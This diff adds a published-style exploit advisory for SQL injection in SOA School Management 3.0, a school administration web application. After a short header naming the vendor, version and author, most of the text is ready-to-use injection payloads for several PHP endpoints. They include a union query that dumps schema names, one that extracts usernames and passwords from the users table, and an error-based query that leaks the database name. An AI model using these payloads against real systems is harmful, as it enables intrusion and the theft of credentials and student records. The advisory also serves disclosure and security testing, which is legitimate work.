@@ -1,0 +1,36 @@
+# # # # #
+# Exploit Title: SOA School Management 3.0 - SQL Injection
+# Dork: N/A
+# Date: 18.08.2017
+# Vendor Homepage : https://ynetinteractive.com/
+# Software Link: http://codecanyon.net/item/soa-school-management-software-with-integrated-parents-students-portal/20435367?s_rank=3
+# Demo: http://demo.ynetinteractive.com/soa/
+# Version: 3.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+#
+# Proof of Concept:
+# http://localhost/[PATH]/drivers/jquery/usersession_exam.php?id=[SQL]
+# http://localhost/[PATH]/drivers/jquery/session_exam.php?id=[SQL]
+# 1'+/*!44444union*/+/*!44444select*/+1,2,(sELECT+eXPORT_sET(0x35,@:=0,(sELECT+cOUNT(*)fROM(iNFORMATiON_sCHEMA.cOLUMNS)wHERE@:=eXPORT_sET(0x35,eXPORT_sET(0x35,@,tABLE_nAME,0x3c6c693e,2),cOLUMN_nAME,0xa3a,2)),@,0x32)),4,5--+-
+# 1'+/*!44444union*/+/*!44444select*/+1,2,concat(username,0x3a,password),4,5+from+users--+-
+# 
+# http://localhost/[PATH]/Assignment.php?student_id=[SQL]
+# 7'and+(select+0x31+from (select+count(*),concat((select(select concat(cast(database() as char),0x7e))+from information_schema.tables+where table_schema=database()+limit 0,1),floor(rand(0)*2))x from+information_schema.tables+group+by+x)a)+AND ''='
+# 
+# http://localhost/[PATH]/Fee.php?pay&student_id=7&fee_id=[SQL]
+# 
+# http://localhost/[PATH]/YearBook.php?session_id=[SQL]
+# 
+# http://localhost/[PATH]/Transaction.php?invoice=[SQL]
+# 
+# Etc...
+# # # # #
